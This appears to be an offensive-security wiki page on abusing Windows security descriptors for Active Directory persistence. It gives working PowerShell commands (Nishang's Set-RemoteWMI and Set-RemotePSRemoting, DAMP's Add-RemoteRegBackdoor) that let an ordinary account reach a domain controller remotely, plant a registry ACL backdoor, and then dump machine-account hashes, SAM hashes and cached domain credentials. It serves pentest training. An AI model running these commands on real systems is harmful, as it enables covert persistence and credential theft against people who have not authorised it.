# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

Windows security descriptors contain an owner SID, a primary-group SID, a discretionary ACL (DACL) that controls access, and a system ACL (SACL) used mainly for auditing. Security Descriptor Definition Language (SDDL) is the textual representation; an ACE string has the form `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

A security descriptor stores who owns a securable object and which principals are allowed or denied specific rights over it. If an attacker can change a DACL, they may grant a low-privileged principal rights that normally require an administrative role.

This makes narrowly modified descriptors useful for persistence: the account remains outside obvious privileged groups while retaining access to a particular management surface. Preserve the original descriptor before testing so the change can be removed exactly.

### Access to WMI

You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:

```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```

### Access to WinRM

Grant a user access to a remote PowerShell/WinRM endpoint with Nishang's `Set-RemotePSRemoting` function:<sup>[[2]](#references)</sup>

```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```

### Remote access to hashes

DAMP can create a registry-ACL backdoor that later permits remote retrieval of the machine-account hash, local SAM hashes, and cached domain credentials. Granting these narrow rights to an otherwise ordinary account—especially against a domain controller—provides powerful persistence without privileged-group membership.<sup>[[3]](#references)</sup>

```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```

Check [**Silver Tickets**](silver-ticket.md) to learn how you could use the hash of the computer account of a Domain Controller.

## References

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Security descriptor string format](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)

{{#include ../../banners/hacktricks-training.md}}
